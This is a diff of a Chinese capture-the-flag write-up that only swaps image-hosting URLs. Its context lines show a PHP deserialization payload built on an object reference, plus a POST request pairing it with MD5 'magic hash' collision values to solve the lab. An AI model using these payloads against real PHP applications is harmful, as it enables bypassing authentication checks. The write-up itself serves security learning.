@@ -1,6 +1,6 @@
 
 **启动靶机，访问目标地址：**
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014185002207.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20251014185002207.png)
 
 ```php
 <?php  
@@ -95,7 +95,7 @@ $a->input = &$a->correct;
 ```php
 O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014190824408.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20251014190824408.png)
 
 **最后构造完整的请求：**
 ```
@@ -122,5 +122,5 @@ Content-Length: 11
 pleasepost=2&md51=240610708&md52=QNKCDZO&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
 ```
 
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251014193954090.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20251014193954090.png)
 
